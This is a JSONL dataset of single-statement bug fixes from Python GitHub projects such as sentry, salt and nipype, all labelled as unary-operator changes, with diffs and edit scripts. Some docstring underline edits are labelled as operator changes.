{"project": "emesene", "commit_sha": "c08618ec4e0f4761e4bb6c8ee74a9e08df85dd65", "parent_sha": "1ebd83601ab3a3ef1ddbcbf45099bbbc4cc0c855", "file_path": "emesene/gui/base/Conversation.py", "project_url": "https://github.com/tiancj/emesene", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -121,7 +121,7 @@ class Conversation(object):\n         account = self.members[0]\n         contact = self.session.contacts.contacts[account]\n \n-        if not contact.blocked:\n+        if contact.blocked:\n             self.session.unblock(account)\n         else:\n             self.session.block(account)\n", "before": "if not contact . blocked : self . session . unblock ( account ) else : self . session . block ( account )", "after": "if contact . blocked : self . session . unblock ( account ) else : self . session . block ( account )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 6, 40], [\"attribute\", 3, 16, 3, 31], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 31]]]"}
{"project": "XX-Net", "commit_sha": "cda5fefbb7e304599c313637adcd82589ce2d761", "parent_sha": "22605a391c127e699aa2dd3d717e003dd738d397", "file_path": "code/default/gae_proxy/local/check_ip.py", "project_url": "https://github.com/ladenjet/XX-Net", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -140,7 +140,7 @@ import threading\n network_fail_lock = threading.Lock()\n \n def connect_ssl(ip, port=443, timeout=5, check_cert=True, close_cb=None):\n-    if check_local_network.is_ok(ip):\n+    if not check_local_network.is_ok(ip):\n         with network_fail_lock:\n            time.sleep(0.1)\n \n", "before": "if check_local_network . is_ok ( ip ) : with network_fail_lock : time . sleep ( 0.1 )", "after": "if not check_local_network . is_ok ( ip ) : with network_fail_lock : time . sleep ( 0.1 )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 5, 27], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 37], 1]]"}
{"project": "aide", "commit_sha": "256e2e0a5de93b9f34298178f21aa380218ff8cb", "parent_sha": "34a47130e1635c9f86d981d3dc24ffc97837f656", "file_path": "plugins/Relay.py", "project_url": "https://github.com/totte/aide", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -163,7 +163,7 @@ class Relay(privmsgs.CapabilityCheckingPrivmsg):\n         if msg.command == 'PRIVMSG':\n             abbreviations = self.abbreviations.values()\n             r = re.compile(r'<[^@]+@(?:%s)>' % '|'.join(abbreviations))\n-            if r.match(msg.args[1]):\n+            if not r.match(msg.args[1]):\n                 channel = msg.args[0]\n                 abbreviation = self.abbreviations[irc]\n                 s = self._formatPrivmsg(irc.nick, abbreviation, msg)\n", "before": "if r . match ( msg . args [ 1 ] ) : channel = msg . args [ 0 ] abbreviation = self . abbreviations [ irc ] s = self . _formatPrivmsg ( irc . nick , abbreviation , msg )", "after": "if not r . match ( msg . args [ 1 ] ) : channel = msg . args [ 0 ] abbreviation = self . abbreviations [ irc ] s = self . _formatPrivmsg ( irc . nick , abbreviation , msg )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 69], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 36], 1]]"}
{"project": "aeries-mobile", "commit_sha": "e0fbcdbf9973a80df8c3e01a0a4003344b3591e4", "parent_sha": "7e5ed4d33d04fada2f72d0b5cef27054d5995dfa", "file_path": "AeriesAPI.py", "project_url": "https://github.com/andyyu/aeries-mobile", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class AeriesAPI:\n \t\t\tassignmentinfo[\"name\"] = (assignment.contents[1].text)\n \t\t\tassignmentinfo[\"type\"] = (assignment.contents[2].text)\n \t\t\tscore=assignment.contents[4].text\n-\t\t\tassignmentinfo[\"score\"] = 0 if score==\"[]\" or isinstance (score, int) else int(score)\n+\t\t\tassignmentinfo[\"score\"] = 0 if score==\"[]\" or not isinstance (score, int) else int(score)\n \t\t\tassignmentinfo[\"maxscore\"] = int(assignment.contents[5].text)\n \t\t\tassignmentinfo[\"missing\"] = True if score ==\"[]\" else False\n \t\t\tif assignmentinfo[\"maxscore\"] != 0:\n", "before": "assignmentinfo [ \"score\" ] = 0 if score == \"[]\" or isinstance ( score , int ) else int ( score )", "after": "assignmentinfo [ \"score\" ] = 0 if score == \"[]\" or not isinstance ( score , int ) else int ( score )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 35, 3, 73], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 50, 3, 73], 1]]"}
{"project": "cc-core", "commit_sha": "3931ab759f736c03bbdd3045c3232516f7595a1c", "parent_sha": "e906f1bb46b669779bdb13a5aefee7597b102334", "file_path": "cc_core/agent/blue/main.py", "project_url": "https://github.com/curious-containers/cc-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def run(args):\n             raise KeyError('Invalid BLUE file. \"workDir\" is required.')\n         create_working_dir(working_dir)\n \n-        if use_outputs and not 'outputs' not in blue_data:\n+        if use_outputs and 'outputs' not in blue_data:\n             raise AssertionError('--outputs/-o argument is set but no outputs section is defined in BLUE file.')\n \n         # validate command\n", "before": "if use_outputs and not 'outputs' not in blue_data : raise AssertionError ( '--outputs/-o argument is set but no outputs section is defined in BLUE file.' )", "after": "if use_outputs and 'outputs' not in blue_data : raise AssertionError ( '--outputs/-o argument is set but no outputs section is defined in BLUE file.' )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 58], [\"comparison_operator\", 3, 32, 3, 58], 2], [\"Delete\", [\"not:not\", 3, 28, 3, 31]], [\"Delete\", [\"not_operator\", 3, 28, 3, 58]]]"}
{"project": "Theano", "commit_sha": "7618b869bc52f9cbc8f076811742bb9d40d3cf86", "parent_sha": "0d77176734ab3167cea6433c6ff19c9cfdbe2167", "file_path": "theano/gof/graph.py", "project_url": "https://github.com/lamblin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -705,7 +705,7 @@ def variables_and_orphans(i, o):\n     dfs traversal and chooses the orphans among them\n \n     Parameters\n-    -----------\n+    ----------\n     i : list\n          Input variables.\n     o : list\n", "before": "- - - - - - - - - - - i : list", "after": "- - - - - - - - - - i : list", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"expression_statement\", 3, 5, 4, 13], [\"unary_operator\", 3, 6, 4, 13], 0], [\"Delete\", [\"-:-\", 3, 5, 3, 6]], [\"Delete\", [\"unary_operator\", 3, 5, 4, 13]]]"}
{"project": "ASteCA", "commit_sha": "b6ca2a2df8b7e614dc9beb38e99400e3b69208bf", "parent_sha": "240178a3c797910d6a807a41a8dd6c2f94d82cfb", "file_path": "functions/_in/get_in_clusters.py", "project_url": "https://github.com/asteca/ASteCA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,6 +41,6 @@ def in_clusters(mypath, file_end):\n                 cl_files.append([mypath, input_dir, subdir, f])\n \n     # Return sorted list by cluster file name.\n-    cl_files.sort(key=lambda x: x[1].lower())\n+    cl_files.sort(key=lambda x: x[-1].lower())\n \n     return cl_files\n\\ No newline at end of file\n", "before": "cl_files . sort ( key = lambda x : x [ 1 ] . lower ( ) )", "after": "cl_files . sort ( key = lambda x : x [ - 1 ] . lower ( ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"subscript\", 3, 33, 3, 37], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 35, 3, 36], 1]]"}
{"project": "lobster", "commit_sha": "cb5669a97fab7c84150c5f4472a5ec583cca212a", "parent_sha": "b4def10e77a6e2884db07dd3c598c884f94a7de3", "file_path": "lobster/core/source.py", "project_url": "https://github.com/NDCMS/lobster", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -160,7 +160,7 @@ class TaskProvider(object):\n             self.taskid = util.checkpoint(self.workdir, 'id')\n             util.register_checkpoint(self.workdir, 'RESTARTED', str(datetime.datetime.utcnow()))\n \n-        if self.config.advanced.use_dashboard and not self.config.advanced.require_proxy:\n+        if self.config.advanced.use_dashboard and self.config.advanced.require_proxy:\n             logger.info(\"using dashboard with task id {0}\".format(self.taskid))\n             monitor = dash.Monitor\n         else:\n", "before": "if self . config . advanced . use_dashboard and not self . config . advanced . require_proxy : logger . info ( \"using dashboard with task id {0}\" . format ( self . taskid ) ) monitor = dash . Monitor else : ", "after": "if self . config . advanced . use_dashboard and self . config . advanced . require_proxy : logger . info ( \"using dashboard with task id {0}\" . format ( self . taskid ) ) monitor = dash . Monitor else : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 89], [\"attribute\", 3, 55, 3, 89], 2], [\"Delete\", [\"not:not\", 3, 51, 3, 54]], [\"Delete\", [\"not_operator\", 3, 51, 3, 89]]]"}
{"project": "music21", "commit_sha": "35f5e9a01dee32277d4f2f91f70635d62421a897", "parent_sha": "a54983b9c50a2df43e2f330a4561156dc588d94a", "file_path": "music21/figuredBass/possibility.py", "project_url": "https://github.com/ELVIS-Project/music21", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -438,7 +438,7 @@ class Possibility(dict):\n                 hasCorrectTessitura = False\n             if not verbose:\n                 return hasCorrectTessitura\n-        if not fbRules.filterPitchesByRange:\n+        if fbRules.filterPitchesByRange:\n             pitchesInRange = self.pitchesWithinRange(sortedVoiceList, verbose)\n             if not pitchesInRange:\n                 hasCorrectTessitura = False\n", "before": "if not fbRules . filterPitchesByRange : pitchesInRange = self . pitchesWithinRange ( sortedVoiceList , verbose ) if not pitchesInRange : hasCorrectTessitura = False", "after": "if fbRules . filterPitchesByRange : pitchesInRange = self . pitchesWithinRange ( sortedVoiceList , verbose ) if not pitchesInRange : hasCorrectTessitura = False", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 6, 44], [\"attribute\", 3, 16, 3, 44], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 44]]]"}
{"project": "django-oscar", "commit_sha": "ef70897cb5d96204f632d3fe300a11bbd8d3b354", "parent_sha": "6709890048f418e456e2ca140c61a457d8a55965", "file_path": "oscar/apps/basket/abstract_models.py", "project_url": "https://github.com/koopg/django-oscar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -689,7 +689,7 @@ class AbstractLine(models.Model):\n \n     @property\n     def is_tax_known(self):\n-        if hasattr(self, 'strategy'):\n+        if not hasattr(self, 'strategy'):\n             return False\n         return self.stockinfo.price.is_tax_known\n \n", "before": "if hasattr ( self , 'strategy' ) : return False", "after": "if not hasattr ( self , 'strategy' ) : return False", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 25], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 37], 1]]"}
{"project": "dftimewolf", "commit_sha": "714d0afe3567239733c233feb52cd4fe2ee04586", "parent_sha": "05fc1bc673cc3cfa55443fd74bd481a1f7ce77fd", "file_path": "setup.py", "project_url": "https://github.com/log2timeline/dftimewolf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ def ParseRequirements(filename):\n   with open(filename) as requirements:\n \n     for line in requirements.readlines():\n-      if not (line.startswith('#') or line.startswith('-i') or not line):\n+      if line.startswith('#') or line.startswith('-i') or not line:\n         # Skip lines starting with '#' and '-i https://pypi.org/simple'\n         continue\n       reqs.append(line)\n", "before": "if not ( line . startswith ( '#' ) or line . startswith ( '-i' ) or not line ) : continue", "after": "if line . startswith ( '#' ) or line . startswith ( '-i' ) or not line : continue", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 7, 5, 17], [\"boolean_operator\", 3, 15, 3, 72], 1], [\"Delete\", [\"not:not\", 3, 10, 3, 13]], [\"Delete\", [\"(:(\", 3, 14, 3, 15]], [\"Delete\", [\"):)\", 3, 72, 3, 73]], [\"Delete\", [\"parenthesized_expression\", 3, 14, 3, 73]], [\"Delete\", [\"not_operator\", 3, 10, 3, 73]]]"}
{"project": "teneto", "commit_sha": "5a0a71ce9ab7f0c581330e17f4a648d8084a3fb4", "parent_sha": "db247df1d88e0ad9f6d828081b3190826f9968bf", "file_path": "teneto/classes/bids.py", "project_url": "https://github.com/wiheto/teneto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -706,7 +706,7 @@ class TenetoBIDS:\n             sidecar['threshold'] = exclusion_criteria\n             for af in ['.tsv','.nii.gz']: \n                 f = f.split(af)[0] \n-            f += + '.json'\n+            f += '.json'\n             with open(f, 'w') as fs:\n                 json.dump(sidecar, fs)\n         print('Removed ' + str(bs) + ' files from inclusion.')\n", "before": "f += + '.json'", "after": "f += '.json'", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"augmented_assignment\", 3, 13, 3, 27], [\"string:'.json'\", 3, 20, 3, 27], 2], [\"Delete\", [\"+:+\", 3, 18, 3, 19]], [\"Delete\", [\"unary_operator\", 3, 18, 3, 27]]]"}
{"project": "bo-python", "commit_sha": "a38db547773fda23b952681c07b865d9fd8b3e87", "parent_sha": "1b6da7b27d3da18b02a4da06e218ddccf13d3006", "file_path": "blitzortung/service/general.py", "project_url": "https://github.com/wuan/bo-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def create_time_interval(minute_length, minute_offset):\n     end_time = datetime.datetime.utcnow()\n     end_time = end_time.replace(tzinfo=pytz.UTC)\n     end_time = end_time.replace(microsecond=0)\n-    end_time += datetime.timedelta(minutes=minute_offset)\n+    end_time += datetime.timedelta(minutes=-minute_offset)\n     start_time = end_time - datetime.timedelta(minutes=minute_length)\n     return blitzortung.db.query.TimeInterval(start_time, end_time)\n \n", "before": "end_time += datetime . timedelta ( minutes = minute_offset )", "after": "end_time += datetime . timedelta ( minutes = - minute_offset )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 36, 3, 57], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:minute_offset\", 3, 44, 3, 57], 1]]"}
{"project": "bo-python", "commit_sha": "409b48b15528cf2359a55c0005be1741ba949ca1", "parent_sha": "ca1d9b1484c2c383878b481b32a7c855a75162d6", "file_path": "blitzortung/service/general.py", "project_url": "https://github.com/wuan/bo-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def create_time_interval(minute_length, minute_offset):\n     end_time = datetime.datetime.utcnow()\n     end_time = end_time.replace(tzinfo=pytz.UTC)\n     end_time = end_time.replace(microsecond=0)\n-    end_time += datetime.timedelta(minutes=-minute_offset)\n+    end_time += datetime.timedelta(minutes=minute_offset)\n     start_time = end_time - datetime.timedelta(minutes=minute_length)\n     return blitzortung.db.query.TimeInterval(start_time, end_time)\n \n", "before": "end_time += datetime . timedelta ( minutes = - minute_offset )", "after": "end_time += datetime . timedelta ( minutes = minute_offset )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"keyword_argument\", 3, 36, 3, 58], [\"identifier:minute_offset\", 3, 45, 3, 58], 2], [\"Delete\", [\"-:-\", 3, 44, 3, 45]], [\"Delete\", [\"unary_operator\", 3, 44, 3, 58]]]"}
{"project": "nipype", "commit_sha": "5778403072d7053bb4b9c3139b6be914faf4d373", "parent_sha": "8f73c92f50a24daf7bbcf77c02a0881b431b91bd", "file_path": "nipype/interfaces/fsl/preprocess.py", "project_url": "https://github.com/LabNeuroCogDevel/nipype", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -439,10 +439,10 @@ class ApplyXfm(FLIRT):\n \n \n     Examples\n-    -------\n+    --------\n \n     >>> import nipype.interfaces.fsl as fsl\n-    >>> from nipype.testing import anatfile, template, transfm \n+    >>> from nipype.testing import anatfile, template, transfm\n     >>> applyxfm = fsl.ApplyXfm()\n     >>> applyxfm.inputs.in_file = anatfile\n", "before": "- - - - - - - >> > import nipype . interfaces . fsl as fsl", "after": "- - - - - - - - >> > import nipype . interfaces . fsl as fsl", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"unary_operator\", 3, 10, 5, 44], [\"-:-\", \"T\"], 0], [\"Move\", [\"unary_operator\", 3, 10, 5, 44], [\"unary_operator\", 3, 10, 5, 44], 1]]"}
{"project": "nipype", "commit_sha": "8fde7e24863a4e4b7fc59a66096fc68fba0dd377", "parent_sha": "dbac36da12daad2304214915815eda4ee4f43adf", "file_path": "nipype/interfaces/base.py", "project_url": "https://github.com/LabNeuroCogDevel/nipype", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1388,7 +1388,7 @@ def get_max_resources_used(pid, mem_mb, num_threads, pyfunc=False):\n \n     Parameters\n-    ---------\n+    ----------\n     pid : integer\n         the process ID of process to profile\n     mem_mb : float\n", "before": "- - - - - - - - - pid : integer", "after": "- - - - - - - - - - pid : integer", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"unary_operator\", 2, 13, 3, 18], [\"-:-\", \"T\"], 0], [\"Move\", [\"unary_operator\", 2, 13, 3, 18], [\"unary_operator\", 2, 13, 3, 18], 1]]"}
{"project": "sentry", "commit_sha": "432e3d10d91f3eb3a97e8bd044834d2cb0c93e3a", "parent_sha": "1f064307761b1f534c1f40f9faac3582257e388f", "file_path": "src/sentry/web/frontend/organization_members.py", "project_url": "https://github.com/ixc/sentry", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class OrganizationMembersView(OrganizationView):\n \n         member_list = []\n         for om in queryset:\n-            needs_sso = bool(auth_provider and getattr(om.flags, 'sso:linked'))\n+            needs_sso = bool(auth_provider and not getattr(om.flags, 'sso:linked'))\n             member_list.append((om, team_map[om.id], needs_sso))\n \n         # if the member is not the only owner we allow them to leave the org\n", "before": "needs_sso = bool ( auth_provider and getattr ( om . flags , 'sso:linked' ) )", "after": "needs_sso = bool ( auth_provider and not getattr ( om . flags , 'sso:linked' ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 30, 3, 79], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 48, 3, 79], 1]]"}
{"project": "sentry", "commit_sha": "054ef0bc4d6cae062c9777d3feceeb337dc41b34", "parent_sha": "c30399a4f2496b8891810b19021b86b7da96893a", "file_path": "src/sentry/web/frontend/organization_auth_settings.py", "project_url": "https://github.com/ixc/sentry", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ class OrganizationAuthSettingsView(OrganizationView):\n \n         pending_links_count = OrganizationMember.objects.filter(\n             organization=organization,\n-            flags=getattr(OrganizationMember.flags, 'sso:linked'),\n+            flags=~getattr(OrganizationMember.flags, 'sso:linked'),\n         ).count()\n \n         context = {\n", "before": "pending_links_count = OrganizationMember . objects . filter ( organization = organization , flags = getattr ( OrganizationMember . flags , 'sso:linked' ) , ) . count ( )", "after": "pending_links_count = OrganizationMember . objects . filter ( organization = organization , flags = ~ getattr ( OrganizationMember . flags , 'sso:linked' ) , ) . count ( )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 13, 3, 66], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"~:~\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 19, 3, 66], 1]]"}
{"project": "sentry", "commit_sha": "0ca727f0ce5877ba2ca3ef74c9309c752a51fbf6", "parent_sha": "b1d1a4aa76cc057f4f84df4e8ee4806d52c246ab", "file_path": "src/sentry/web/frontend/project_plugin_enable.py", "project_url": "https://github.com/ixc/sentry", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class ProjectPluginEnableView(ProjectView):\n         except KeyError:\n             return self.redirect(reverse('sentry-configure-project-plugin', args=[project.organization.slug, project.slug, slug]))\n \n-        if not plugin.is_enabled(project):\n+        if plugin.is_enabled(project):\n             return self.redirect(reverse('sentry-configure-project-plugin', args=[project.organization.slug, project.slug, slug]))\n \n         plugin.enable(project=project)\n", "before": "if not plugin . is_enabled ( project ) : return self . redirect ( reverse ( 'sentry-configure-project-plugin' , args = [ project . organization . slug , project . slug , slug ] ) )", "after": "if plugin . is_enabled ( project ) : return self . redirect ( reverse ( 'sentry-configure-project-plugin' , args = [ project . organization . slug , project . slug , slug ] ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 4, 131], [\"call\", 3, 16, 3, 42], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 42]]]"}
{"project": "salt", "commit_sha": "885f4f551e0fe0c090805ff1c2e9cd525386927e", "parent_sha": "ef6f7a4f93bda8becb2f66e397c2c18318fd7414", "file_path": "salt/modules/mdadm.py", "project_url": "https://github.com/luciddg/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def __virtual__():\n     '''\n     mdadm provides raid functions for Linux\n     '''\n-    if __grains__['kernel'] == 'Linux':\n+    if not __grains__['kernel'] == 'Linux':\n         return False\n     if not salt.utils.which('mdadm'):\n         return False\n", "before": "if __grains__ [ 'kernel' ] == 'Linux' : return False", "after": "if not __grains__ [ 'kernel' ] == 'Linux' : return False", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 21], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 39], 1]]"}
{"project": "scripts", "commit_sha": "9392737b57669dac55c18923f3299d76481518bf", "parent_sha": "0d589d66d441fe94ee85c03f4fbd5dcb2fb60c59", "file_path": "scripts/gis/gdal_cut2ndv.py", "project_url": "https://github.com/arjanverkerk/scripts", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def replace(source_path, target_path):\n     target_no_data_value = np.finfo(dtype).max.item()\n     condition = np.logical_or.reduce([\n         source_values == source_no_data_value,\n-        source_values < 1000,\n+        source_values < -1000,\n         source_values > 1000,\n     ])\n     target_values = np.where(condition, target_no_data_value, source_values)\n", "before": "condition = np . logical_or . reduce ( [ source_values == source_no_data_value , source_values < 1000 , source_values > 1000 , ] )", "after": "condition = np . logical_or . reduce ( [ source_values == source_no_data_value , source_values < - 1000 , source_values > 1000 , ] )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 9, 3, 29], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1000\", 3, 25, 3, 29], 1]]"}
{"project": "databroker", "commit_sha": "f6eb46a4821204002baaa15fe99ef3b6dd719e59", "parent_sha": "ed8117f53b04baddb9caaaf74756058103b56911", "file_path": "metadatastore/core.py", "project_url": "https://github.com/danielballan/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -862,7 +862,7 @@ def find_run_starts(run_start_col, run_start_cache, tz, **kwargs):\n     # now try rest of formatting\n     _format_time(kwargs, tz)\n-    rs_objects = run_start_col.find(kwargs, sort=[('time', 1)])\n+    rs_objects = run_start_col.find(kwargs, sort=[('time', -1)])\n \n     for rs in rs_objects:\n         yield _cache_run_start(rs, run_start_cache)\n", "before": "rs_objects = run_start_col . find ( kwargs , sort = [ ( 'time' , 1 ) ] )", "after": "rs_objects = run_start_col . find ( kwargs , sort = [ ( 'time' , - 1 ) ] )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"tuple\", 2, 51, 2, 62], [\"unary_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 2, 60, 2, 61], 1]]"}
{"project": "terminal_advisor", "commit_sha": "610ffe28bc4babf6b27c774fb54bfa0c066cede1", "parent_sha": "f50ba241b0681b9ebbea0b41983394f29a74263c", "file_path": "terminal_advisor/gui/main.py", "project_url": "https://github.com/canance/terminal_advisor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class GUIApp(QtWidgets.QMainWindow, main_window.Ui_MainWindow):\n     @pyqtSlot()\n     def update_window(self):\n         # status bar\n-        status = 'Logged out' if self.advisor.logged_in else 'Logged in as %s' % self.advisor.username\n+        status = 'Logged out' if not self.advisor.logged_in else 'Logged in as %s' % self.advisor.username\n         self.status_bar.showMessage(status)\n \n         # button refresh\n", "before": "status = 'Logged out' if self . advisor . logged_in else 'Logged in as %s' % self . advisor . username", "after": "status = 'Logged out' if not self . advisor . logged_in else 'Logged in as %s' % self . advisor . username", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"conditional_expression\", 3, 18, 3, 103], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 34, 3, 56], 1]]"}
{"project": "deepTools", "commit_sha": "6dff239b6afce47b788caf34aa119efd3d0efe87", "parent_sha": "3d350c8238bc481bdd157fff61a824a2200be095", "file_path": "deeptools/bamHandler.py", "project_url": "https://github.com/fw1121/deepTools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ def openBam(bamFile, bamIndex=None):\n         sys.exit( \"Bam file {} does not exist\".format( bamFile ) )\n \n     if bamIndex and bamIndex != bamFile + \".bai\":\n-        if os.path.exists( bamIndex ):\n+        if not os.path.exists( bamIndex ):\n             exit(\"Given Index file {} does not exists.\\n Be sure that the bam file you are using is indexed.\".format(bamIndex))\n \n         tmpDir = tempfile.mkdtemp()\n", "before": "if os . path . exists ( bamIndex ) : exit ( \"Given Index file {} does not exists.\\n Be sure that the bam file you are using is indexed.\" . format ( bamIndex ) )", "after": "if not os . path . exists ( bamIndex ) : exit ( \"Given Index file {} does not exists.\\n Be sure that the bam file you are using is indexed.\" . format ( bamIndex ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 128], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 38], 1]]"}
{"project": "knowledge-repo", "commit_sha": "194d2453afa708b9eb608d27fa58da4c4b5fbaf1", "parent_sha": "adc8b346520dc04e06dd9150656984fa111eb3bf", "file_path": "knowledge_repo/repositories/gitrepository.py", "project_url": "https://github.com/cybernetics/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -365,7 +365,7 @@ class GitKnowledgeRepository(KnowledgeRepository):\n             raise e\n \n     def _submit(self, path=None, branch=None, force=False):\n-        if self.git_has_remote:\n+        if not self.git_has_remote:\n             raise RuntimeError(\"Could not find remote repository `{}` into which this branch should be submitted.\".format(self.config.remote_name))\n         if branch is None and path is None:\n             raise ValueError(\"To submit a knowledge post, a path to the post and/or a git branch must be specified.\")\n", "before": "if self . git_has_remote : raise RuntimeError ( \"Could not find remote repository `{}` into which this branch should be submitted.\" . format ( self . config . remote_name ) )", "after": "if not self . git_has_remote : raise RuntimeError ( \"Could not find remote repository `{}` into which this branch should be submitted.\" . format ( self . config . remote_name ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 148], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 31], 1]]"}
